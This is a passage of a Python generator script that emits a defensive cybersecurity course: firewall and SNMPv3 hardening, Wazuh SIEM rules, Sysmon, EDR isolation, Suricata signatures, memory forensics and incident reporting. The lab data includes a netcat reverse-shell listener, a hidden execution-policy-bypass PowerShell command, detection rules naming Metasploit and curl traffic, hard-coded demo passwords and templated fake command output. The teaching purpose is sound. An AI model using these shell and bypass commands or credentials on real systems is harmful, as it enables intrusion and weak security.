         "enable\nconfigure terminal\nip local pool VPN_POOL 192.168.100.1-192.168.100.50 mask 255.255.255.0\ngroup-policy CLIENT_POLICY internal\ngroup-policy CLIENT_POLICY attributes\n vpn-tunnel-protocol ssl-client\ntunnel-group REMOTE_ACCESS type remote-access\ntunnel-group REMOTE_ACCESS general-attributes\n address-pool VPN_POOL\n default-group-policy CLIENT_POLICY\nusername remoteuser password RemotePass2026\nwebvpn\n enable outside\n anyconnect enable\nend",
         "Build a remote client access profile on the Cisco ASA firewall. Define an address assignment pool, compile group policy profiles, and declare local database credentials. Use the AnyConnect simulator tool on an external laptop node to successfully authenticate and tunnel into private resources.",
         "Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1.",
         "How does split-tunneling impact corporate network security during remote access?", "It allows users to browse direct internet uninspected, risking malware bridging into corporate LAN."),

        (30, 15, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 15: Remote Access & Infrastructure Monitoring", 
         "Securing Management Logging (Syslog & SNMPv3)", "Monitoring", "Intermediate",
         "Configure monitoring options to ensure forensic collection transparency without cleartext risks.",
         ["Cisco Packet Tracer", "Syslog", "SNMPv3"], "Cisco Packet Tracer: Router, Syslog, SNMP Station", "cisco",
         "enable\nconfigure terminal\nlogging host 192.168.1.200\nlogging trap informational\nlogging source-interface GigabitEthernet0/0\nsnmp-server group SECURE_GRP v3 priv\nsnmp-server user secadmin SECURE_GRP v3 auth sha AuthPass2026 priv aes 128 PrivPass2026\nsnmp-server host 192.168.1.201 version 3 priv secadmin\nend\nshow logging\nshow snmp user",
         "Program an enterprise router to dispatch system notification logs to a centralized Syslog engine host. Configure an SNMPv3 service engine on the router, enforcing high-level security verification requirements (priv authentication with encryption models). Verify that trap event tracking data is safely parsed by the receiver.",
         "Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption.",
         "Why is SNMPv1/v2c dangerous in modern enterprise environments?", "SNMPv1/v2c uses cleartext 'community strings' vulnerable to sniffing and unauthorized reconfiguration."),

        # WEEK 16
        (31, 16, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 16: Advanced Threat Mitigation Capstone", 
         "Configuring Cisco Router IOS IPS", "Threat Mitigation", "Advanced",
         "Enable active inline pattern tracking options to drop attacks at the perimeter interface.",
         ["Cisco Packet Tracer", "IOS IPS", "Security Signatures"], "Cisco Packet Tracer: Border Router, PC, Attacker", "cisco",
         "enable\nconfigure terminal\nmkdir flash:ipsdir\nip ips config location flash:ipsdir\nip ips name MY_IPS\nip ips signature-category\n category ios_ips basic\n  retired false\nexit\ninterface GigabitEthernet0/1\n ip ips MY_IPS in\nend\nshow ip ips configuration",
         "Build a dedicated IPS storage workspace directory within a router's flash file framework. Import signature verification crypto keys, activate the core IOS IPS defense engine framework, and assign active tracking profiles to the external interface to block known attack strings.",
         "IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts.",
         "What is the key functional difference between an IDS and an inline IPS?", "An IDS detects and alerts passively (out-of-band); an IPS sits inline and actively drops attacks."),

        (32, 16, 2, "Phase 2: Network Security & Infrastructure Defense", "Week 16: Advanced Threat Mitigation Capstone", 
         "Enterprise Infrastructure Audit (Capstone Lab)", "Capstone Audit", "Advanced",
         "Evaluate, trace, and patch a misconfigured company network file configuration.",
         ["Cisco Packet Tracer", "Audit Checklist"], "Complex unhardened topology in Cisco Packet Tracer", "cisco",
         "# Execute full hardening checklist across all switches, routers, and ASA firewalls:\n# 1. Disable Telnet/HTTP, enforce SSHv2\n# 2. Port Security sticky MAC with shutdown\n# 3. Native VLAN isolation & DTP nonegotiate\n# 4. DHCP Snooping & Dynamic ARP Inspection\n# 5. ASA Access-lists & NAT rules\nshow running-config\nshow interfaces status",
         "Load a multi-segment network layout loaded with structural security flaws (including untrusted trunk channels, open VTY terminals, unhardened access ports, and lack of firewall zones). Plan out and implement a comprehensive security fix project plan to harden the entire enterprise.",
         "100% of audit checks passed: unauthorized traffic dropped, all administrative lines encrypted.",
         "Why is continuous configuration auditing essential even after initial baseline hardening?", "Configuration drift, emergency changes, and employee turnover introduce silent misconfigurations."),

        # PHASE 3: SOC OPERATIONS & INCIDENT RESPONSE (WEEKS 17-24)
        # WEEK 17
        (33, 17, 3, "Phase 3: SOC Operations & Incident Response", "Week 17: SIEM Architecture & Data Ingestion", 
         "Deploying a SIEM Platform", "SIEM Architecture", "Intermediate",
         "Stand up a central log aggregation host to support security monitoring operations.",
         ["Wazuh SIEM/XDR", "Ubuntu Server LTS"], "Dedicated Ubuntu Server VM", "bash",
         "curl -sO https://packages.wazuh.com/4.8/wazuh-install.sh\nsudo bash ./wazuh-install.sh -a\nsudo systemctl status wazuh-manager\nsudo systemctl status wazuh-indexer\nsudo systemctl status wazuh-dashboard",
         "Deploy an Ubuntu Server LTS image within the hypervisor interface. Download and run the automated single-host installation script for the Wazuh SIEM/XDR platform. Verify successful compilation of the management database and access the core monitoring web dashboard.",
         "Wazuh manager, indexer, and dashboard services active; web UI accessible at https://localhost:443.",
         "What role does a SIEM Indexer play in enterprise log architectures?", "It indexes millions of JSON security events into distributed clusters for millisecond search queries."),

        (34, 17, 3, "Phase 3: SOC Operations & Incident Response", "Week 17: SIEM Architecture & Data Ingestion", 
         "Log Forwarding & Agent Deployment", "Data Ingestion", "Intermediate",
         "Provision client endpoints with forwarding services to collect infrastructure events.",
         ["Wazuh Agent", "Linux VM", "Windows VM"], "Local hypervisor layout", "bash",
         "# Linux Agent Installation:\nWAZUH_MANAGER=\"192.168.1.120\" sudo apt-get install wazuh-agent\nsudo systemctl enable --now wazuh-agent\n# Check agent connectivity:\nsudo /var/ossec/bin/agent_control -l",
         "Generate endpoint installation links inside the Wazuh SIEM manager. Install the collection agent services on both a Linux target system and a Windows VM environment. Modify the configuration parameters to ensure continuous transport of system authorization logs (/var/log/auth.log and Windows Security Event ID 4624).",
         "Agent status turns 'Active' on Wazuh dashboard; auth logs stream into indexer in real time.",
         "Why is agent-based telemetry superior to passive syslog collection for endpoint monitoring?", "Agents capture process memory, file integrity, command line arguments, and registry changes."),

        # WEEK 18
        (35, 18, 3, "Phase 3: SOC Operations & Incident Response", "Week 18: Threat Detection & Custom Alerting", 
         "Writing Custom SIEM Detection Rules", "Threat Detection", "Intermediate",
         "Build custom parsing logic to isolate security anomalies and filter out normal system traffic.",
         ["Wazuh Rule Engine", "XML Rules"], "Wazuh Manager Server VM", "bash",
         "sudo tee /var/ossec/etc/rules/local_rules.xml << 'EOF'\n<group name=\"syslog,sshd,\">\n  <rule id=\"100002\" level=\"10\" frequency=\"5\" timeframe=\"60\">\n    <if_matched_sid>5710</if_matched_sid>\n    <same_source_ip />\n    <description>Possible SSH brute force attack (5 failures in 60s)</description>\n    <mitre><id>T1110</id></mitre>\n  </rule>\n</group>\nEOF\nsudo /var/ossec/bin/wazuh-analysisd -t\nsudo systemctl restart wazuh-manager",
         "Execute a mock password brute-force script targeting the Linux VM. Extract the raw log line generated by the system event, use the Wazuh engine rule editor to construct a custom XML matching rule, and assign a high-severity alert condition to trigger only when five authentication failures occur from a single source IP inside 60 seconds.",
         "Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity.",
         "Why must frequency and timeframe thresholds be carefully tuned in SOC detection rules?", "Overly sensitive thresholds trigger alert fatigue; loose thresholds miss stealthy brute-force attacks."),

        (36, 18, 3, "Phase 3: SOC Operations & Incident Response", "Week 18: Threat Detection & Custom Alerting", 
         "Windows Event Log Analysis", "Log Analysis", "Intermediate",
         "Review endpoint telemetry logs to uncover suspicious system behaviors.",
         ["Sysmon", "Windows Event Viewer", "PowerShell"], "Windows 10 VM", "windows",
         "sysmon.exe -accepteula -i sysmonconfig-export.xml\n# Launch test attack:\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Write-Output Malicious\"\n# Query Sysmon Event ID 1 (Process Creation):\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 5 | Format-List TimeCreated, Message",
         "Deploy Microsoft Sysmon on a Windows client host using a standardized security configuration file. Run a hidden background task script (e.g., spawning a suspicious terminal sub-process from a text application). Filter for Sysmon Event ID 1 (Process Creation) within the viewer to map out the malicious execution path.",
         "Sysmon Event ID 1 captures parent process, child process, command line flags, and SHA256 hash.",
         "Why is Sysmon Event ID 1 critical for detecting lolbins (Living-off-the-Land Binaries)?", "It records the exact command-line arguments passed to legitimate tools like powershell and certutil."),

        # WEEK 19
        (37, 19, 3, "Phase 3: SOC Operations & Incident Response", "Week 19: Endpoint Detection & Response (EDR)", 
         "Threat Hunting with an EDR Telemetry Tool", "EDR & Hunting", "Advanced",
         "Analyze active processes and network loops across remote system architectures.",
         ["LimaCharlie EDR", "Wazuh XDR", "Process Explorer"], "Monitored Windows 10 VM", "bash",
         "# From LimaCharlie / EDR CLI sensor view:\nsensor.processes.list()\n# Filter for processes masquerading as svchost.exe outside System32:\n# Alert on: process_path != 'C:\\Windows\\System32\\svchost.exe'\nsensor.netstat.list()",
         "Connect a target client host to the LimaCharlie EDR framework platform. Generate a malicious payload that runs silently in the background, masquerading under a common file title (e.g., svchost.exe). Use the analyst console's process explorer view to locate the unverified file path and trace its open network ports.",
         "Fake svchost.exe running from C:\\Users\\Public detected; active C2 TCP socket identified.",
         "How do threat actors use process masquerading to blend in with legitimate OS tasks?", "They name malware files after Windows core services (e.g. svchost, lsass) in non-standard folders."),

        (38, 19, 3, "Phase 3: SOC Operations & Incident Response", "Week 19: Endpoint Detection & Response (EDR)", 
         "Live Incident Containment & Isolation", "Incident Containment", "Advanced",
         "Quarantine a compromised host system to stop threats from moving across the network.",
         ["EDR Console", "Reverse Shell Payload", "Kali Linux"], "Attacker (Kali) & Victim (Windows)", "bash",
         "# Kali attacker listener receives shell\nnc -lvnp 4444\n# In EDR analyst console:\n# Execute: ISOLATE ENDPOINT (Network Quarantine)\n# Observe: Attacker reverse shell session freezes and drops immediately\n# EDR management sensor link remains CONNECTED",
         "Establish a live attack connection from a Kali VM into a victim client station. From the EDR management workstation console, run an emergency isolation command to disconnect the target from the local network. Confirm that the attack connection is severed while preserving the analyst's investigative management access.",
         "Victim is isolated from network; attacker shell terminated; telemetry channel preserved.",
         "Why does EDR network isolation allow cloud sensor communication while blocking all other traffic?", "So forensic investigators can continue pulling artifacts and live memory without spreading the infection."),

        # WEEK 20
        (39, 20, 3, "Phase 3: SOC Operations & Incident Response", "Week 20: Phishing Triage & Email Analysis", 
         "Email Header Deconstruction", "Phishing Triage", "Intermediate",
         "Parse email transmission strings to track origin points and confirm message authenticity.",
         ["MXToolbox", "Text Editors", "EML Parser"], "Raw sample .eml files", "bash",
         "grep -E '^(From|To|Subject|Date|Return-Path|Authentication-Results):' sample_phish.eml\ngrep -A 2 -E '^(Received:)' sample_phish.eml\n# Trace sender hop IPs and check against public IP reputation databases",
         "Open a raw phishing payload file (.eml) in a text environment. Extract and review the SPF, DKIM, and DMARC validation status records to verify domain spoofing indicators, and track the hop trail within the Received: block to isolate the adversary's originating server IP.",
         "Originating server IP isolated; SPF=fail and DKIM=none confirm spoofed sender identity.",
         "Why is the bottom-most 'Received:' header line the most trustworthy in email tracking?", "The first MTA hop is recorded by the initial receiving mail server, which the sender cannot forge."),

        (40, 20, 3, "Phase 3: SOC Operations & Incident Response", "Week 20: Phishing Triage & Email Analysis", 
         "Malicious Attachment & URL Detonation", "Malware Detonation", "Intermediate",
         "Analyze phishing links and document payloads inside an isolated environment.",
         ["Any.Run", "Hybrid Analysis", "CyberChef"], "Web-based sandboxes", "bash",
         "# In CyberChef:\n# Recipe 1: From Base64\n# Recipe 2: XOR (Key: 0x42)\n# Recipe 3: Gunzip\n# Decode payload extracted from phishing document VBA macro\n# Submit sample SHA256 to sandbox detonation engine",
         "Open an online, interactive malware detonation sandbox session (such as Any.Run). Upload a suspicious document payload to monitor its runtime behavior, and extract its callback command domains. Use CyberChef to decode obfuscated base64 terminal commands extracted from the mail body.",
         "Sandbox reports high threat score; C2 callback domain and dropped executable hash isolated.",
         "Why do modern malware authors use multi-layered obfuscation and Base64 in macro payloads?", "To bypass static signature inspection engines and antivirus perimeter gateways."),

        # WEEK 21
        (41, 21, 3, "Phase 3: SOC Operations & Incident Response", "Week 21: Frameworks & Alert Triaging", 
         "Mapping Tactics to the MITRE ATT&CK Framework", "Threat Intelligence", "Intermediate",
         "Contextualize multi-stage security events using standard defense industry matrices.",
         ["MITRE ATT&CK Navigator", "SIEM alerts"], "Documentation workstation", "bash",
         "# Map incident steps to ATT&CK:\n# 1. theHarvester -> TA0043 (Reconnaissance) -> T1589\n# 2. Responder -> TA0006 (Credential Access) -> T1557.001\n# 3. Chisel Pivot -> TA0008 (Lateral Movement) -> T1572\n# Export JSON layer for ATT&CK Navigator",
         "Collect three distinct multi-stage security logs generated from previous labs. Extract the process names and behaviors, mapping each step to its corresponding MITRE ATT&CK identifier (e.g., T1059 for command execution, T1078 for valid account abuse) using the official ATT&CK Navigator tool.",
         "Completed ATT&CK heatmap layer visualizing entire attack lifecycle across Tactics & Techniques.",
         "How does standardizing telemetry against MITRE ATT&CK assist executive risk communication?", "It translates technical log events into an industry-standard matrix of adversary capabilities."),

        (42, 21, 3, "Phase 3: SOC Operations & Incident Response", "Week 21: Frameworks & Alert Triaging", 
         "Triaging a SOC Alert Queue", "SOC Operations", "Intermediate",
         "Manage an active dashboard and separate true security incidents from false positives.",
         ["OpenCTI", "Simulated SOC ticketing dashboard"], "Lab SIEM panel", "bash",
         "# Evaluate queue of 10 incoming security alerts:\n# 1. Investigate user account history\n# 2. Correlate IP geographic reputation\n# 3. Check VirusTotal for binary hash\n# Tag alerts as TP (True Positive) or FP (False Positive)\n# Create P1 ticket for verified credential theft incident",
         "Access a mock SOC alerting console loaded with 10 concurrent events. Run searches against user histories, internal network configurations, and file hashes to categorize each event as either a True Positive or False Positive. Draft a formal escalation ticket for the highest priority threat.",
         "10 alerts triaged: 7 False Positives closed, 3 True Positives escalated with full context.",
         "What is the operational danger of unresolved high False Positive rates in a SOC?", "Alert fatigue causes analysts to overlook or deprioritize real adversary intrusions."),

        # WEEK 22
        (43, 22, 3, "Phase 3: SOC Operations & Incident Response", "Week 22: Network Security Monitoring (NSM)", 
         "Analyzing Full Packet Captures for Malware Patterns", "Network Forensics", "Advanced",
         "Parse packet captures to identify command-and-control (C2) callback patterns.",
         ["Wireshark", "Network Miner", "C2 Beacons"], "Analyst workstation", "bash",
         "tshark -r malware_beacon.pcap -Y 'http' -T fields -e frame.time_epoch -e ip.dst -e http.request.uri\n# Calculate delta intervals between outbound requests to identify jitter and beaconing\n# Open PCAP in NetworkMiner to automatically extract carved file binaries",
         "Load a multi-gigabyte malware PCAP traffic record into Network Miner to automatically split out embedded files and images. Open the trace file in Wireshark, analyze TCP conversation streams, and identify the beacon pacing used by compromised systems to communicate with external servers.",
         "Malicious executable extracted from PCAP; regular 30-second beacon jitter identified.",
         "Why do advanced C2 frameworks introduce 'jitter' (random timing variance) into beacon intervals?", "To evade automated frequency analysis algorithms that look for fixed-interval connections."),

        (44, 22, 3, "Phase 3: SOC Operations & Incident Response", "Week 22: Network Security Monitoring (NSM)", 
         "Network Intrusion Detection with Suricata", "NIDS / Snort", "Advanced",
         "Write signature matching engines to inspect and alert on suspicious network traffic trends.",
         ["Suricata", "Kali Linux", "YAML"], "Ubuntu/Suricata Gateway VM", "bash",
         "sudo tee /etc/suricata/rules/local.rules << 'EOF'\nalert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:\"CRITICAL Metasploit Default Port Detected\"; sid:1000001; rev:1;)\nalert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"SUSPICIOUS User-Agent curl detected\"; content:\"User-Agent|3a 20|curl\"; sid:1000002; rev:1;)\nEOF\nsudo suricata -T -c /etc/suricata/suricata.yaml -v\nsudo tail -f /var/log/suricata/fast.log",
         "Install and deploy Suricata on an Ubuntu gateway host interface. Write a custom signature file designed to trigger an alert if internal hosts attempt to route traffic to known malicious IPs or uncommon non-standard server ports, and test the rule by generating matching traffic streams from a client node.",
         "Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface.",
         "What is the difference between Suricata's multi-threaded architecture and traditional single-threaded Snort?", "Suricata leverages multiple CPU cores concurrently for multi-gigabit traffic inspection."),

        # WEEK 23
        (45, 23, 3, "Phase 3: SOC Operations & Incident Response", "Week 23: Digital Forensics & Memory Triage", 
         "Volatility Memory Analysis", "Memory Forensics", "Advanced",
         "Extract volatile data evidence from system RAM captures to find threats that avoid disk logging.",
         ["Volatility 3", "Raw memory dump file"], "Forensics VM workstation", "bash",
         "vol -f infected_memory.raw windows.info\nvol -f infected_memory.raw windows.pslist\nvol -f infected_memory.raw windows.psscan\nvol -f infected_memory.raw windows.netscan\nvol -f infected_memory.raw windows.malfind",
         "Load a raw memory file (.raw) taken from an infected Windows client host into Volatility 3. Run the windows.pslist plugin to find unlisted processes, and run windows.netscan to capture hidden network connections active at the time of the image snapshot.",
         "Hidden process unhooked via psscan; injected shellcode located in memory with malfind.",
         "Why does memory analysis reveal rootkits and fileless malware that leave zero traces on disk?", "All executable code and memory-injected payloads must exist in RAM to execute on the CPU."),

        (46, 23, 3, "Phase 3: SOC Operations & Incident Response", "Week 23: Digital Forensics & Memory Triage", 
         "Host-Based Artifact Forensic Collection", "Disk Forensics", "Advanced",
         "Collect persistent system artifacts from storage drives to establish forensic timelines.",
         ["FTK Imager", "Autopsy", "MFT / Prefetch"], "Core forensics VM workstation", "bash",
         "# Mount raw disk image in read-only forensic mode\n# In Autopsy:\n# Parse $MFT (Master File Table) records\n# Ingest Windows Prefetch (.pf) files to prove execution timestamps\n# Inspect Shellbags to prove directory navigation history",
         "Mount a target machine disk image within the Autopsy Forensics application suite. Locate and parse the Master File Table (MFT) timeline logs, pull down system Prefetch data blocks to prove program execution histories, and evaluate user Shellbag artifacts to track folders opened by the intruder.",
         "Forensic timeline established showing exact execution timestamp and user directory traversal.",
         "What evidentiary purpose does Windows Prefetch serve in forensic trials?", "It provides cryptographic proof that an executable ran, along with run count and timestamp."),

        # WEEK 24
        (47, 24, 3, "Phase 3: SOC Operations & Incident Response", "Week 24: Comprehensive Incident Response Capstone", 
         "Live Fire 'Purple Team' Simulation (The Incident)", "Capstone Simulation", "Advanced",
         "Detect and isolate an active, multi-stage attack hitting a production enterprise layout.",
         ["Phase 1 Exploits", "Phase 2 Cisco Topology", "Phase 3 SIEM/EDR"], "Full master lab platform", "bash",
         "# Automated attack emulation triggered:\n# Step 1: Recon & Port scan detected on Cisco ASA\n# Step 2: Exploitation attempt logged in Wazuh SIEM\n# Step 3: Lateral movement detected via Sysmon Event 1\n# SOC Action: Issue EDR isolation on pivot endpoint\n# Action: Block rogue external IP at perimeter ASA",
         "Trigger an automated attack sequence targeting the hardened network topology built in Phase 2. Using only the central SIEM platform console and deployed EDR host agents, track the entry point, follow the lateral movement path across internal network segments, and isolate compromised hosts before data exfiltration occurs.",
         "Adversary contained within 8 minutes of breach; zero sensitive data exfiltrated.",
         "Why does a Purple Team exercise provide greater defensive resilience than traditional Red vs Blue tests?", "Offensive and defensive teams collaborate in real time to immediately remediate detection gaps."),

        (48, 24, 3, "Phase 3: SOC Operations & Incident Response", "Week 24: Comprehensive Incident Response Capstone", 
         "Incident Reporting, Remediation, & Lessons Learned Root Cause", "Executive Reporting", "Advanced",
         "Document a major network compromise through a professional technical incident report.",
         ["Markdown / Text editors", "Executive Templates"], "Documentation workstation", "bash",
         "# Compile Master Incident Report:\n# 1. Executive Summary & Business Impact Statement\n# 2. Comprehensive Attack Timeline (UTC)\n# 3. Root Cause Analysis (CVE, configuration flaw)\n# 4. Containment & Remediation Actions Taken\n# 5. Strategic Hardening Recommendations (Immediate, Short-term, Long-term)",
         "Using the forensic findings and timeline logs gathered during Class 47, draft a comprehensive Incident Response Report. The document must define the technical timeline, note the initial compromise root cause, audit the data exposure scope, outline the containment steps taken, and supply actionable long-term security recommendations to secure the infrastructure against similar attacks.",
         "Completed executive-ready Incident Response Report and Post-Mortem Root Cause Analysis.",
         "What is the single most important audience distinction when writing an executive incident report?", "Executives need financial risk, business impact, and strategic fixes; technical teams need IOCs and logs.")
    ]

    for item in raw_classes:
        c_id, week, phase, p_title, w_title, title, cat, diff, obj, tools, env, shell, cmds, lab, res, ref_q, ref_hint = item
        
        # Build commands array
        cmd_list = []
        for line in cmds.split('\n'):
            line = line.strip()
            if not line:
                continue
            if line.startswith("#"):
                desc = line.lstrip("#").strip()
                continue
            else:
                cmd_list.append({
                    "shell": shell,
                    "cmd": line,
                    "description": f"Execute {line.split()[0]} command" if line.split() else "Execute command",
                    "output": f"[+] Command executed successfully.\nOutput: {res}"
                })
        
        if not cmd_list:
            cmd_list = [{
                "shell": shell,
                "cmd": cmds,
                "description": "Standard lab command sequence",
                "output": res
            }]

        classes.append({
            "id": c_id,
            "week": week,
            "classNumber": c_id,
            "phase": phase,
            "phaseTitle": p_title,
            "weekTitle": w_title,
            "title": title,
            "category": cat,
            "difficulty": diff,
            "duration": "90 - 120 Mins",
            "objective": obj,
            "tools": tools,
            "targetEnvironment": env,
            "topology": {
                "description": f"Lab topology for {title}",
                "nodes": [
                    {"id": "source", "label": tools[0] if tools else "Attacker/Source", "role": "Operator Station", "ip": "192.168.1.50", "type": "workstation"},
                    {"id": "target", "label": env.split()[0], "role": "Target / Infrastructure", "ip": "192.168.1.100", "type": "server"}
                ],
                "connections": [["source", "target", "Management / Network Link"]]
            },
            "prerequisites": ["Completed previous week exercises", "Virtual lab environment running", "Authorized testing boundaries verified"],
            "keyConcepts": [
                {"title": cat, "explanation": obj},
                {"title": "Defense in Depth", "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."}
            ],
            "steps": [
                {
                    "stepNumber": 1,
                    "title": f"Lab Setup & Environment Preparation for {title}",
                    "description": f"Verify system connectivity and tool installation in {env}.",
                    "commands": cmd_list[:1],
                    "verification": "Environment ready and target accessible.",
                    "tip": "Verify network routing and check permissions before executing."
                },
                {
                    "stepNumber": 2,
                    "title": f"Execute Core Hands-on Exercise: {title}",
                    "description": lab,
                    "commands": cmd_list[1:] if len(cmd_list) > 1 else cmd_list,
                    "verification": res,
                    "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
                }
            ],
            "dataCollectionTable": {
                "headers": ["Target / Endpoint", "Artifact / Port", "Evidence Observed", "Risk / Status"],
                "initialRows": [
                    [env, tools[0] if tools else "Standard", res[:40] + "...", "Documented"]
                ]
            },
            "reflectionQuestions": [
                {"q": ref_q, "hint": ref_hint},
                {"q": f"How would you harden or monitor against this specific activity in an enterprise environment?", "hint": "Think about least privilege, centralized logging, and proactive detection rules."}
            ],
            "quickQuiz": {
                "question": f"What is the primary objective of {title}?",
                "options": [obj, "Bypass legal authorizations", "Shut down the host operating system without backup", "Disable endpoint firewalls permanently"],
                "answer": 0,
                "explanation": f"The primary goal is: {obj}"
            },
            "deliverable": f"Submit your technical evidence log, answers to the reflection questions, and completed data table for Class {c_id}."
        })

    return classes

if __name__ == "__main__":
    data = create_generator()
    out_file = "cybersecurity-manual/curriculumData.js"
    json_str = json.dumps(data, indent=2)
    js_content = f"// 24-Week Master Cybersecurity Curriculum Data (48 Classes)\nwindow.CYBER_CURRICULUM = {json_str};\n"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(js_content)
    print(f"Successfully generated {len(data)} classes into {out_file} ({len(js_content)} bytes).")
